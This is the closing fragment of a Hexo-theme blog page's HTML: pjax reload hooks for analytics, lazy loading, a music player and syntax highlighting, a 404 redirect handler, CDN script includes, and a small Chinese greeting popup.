  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>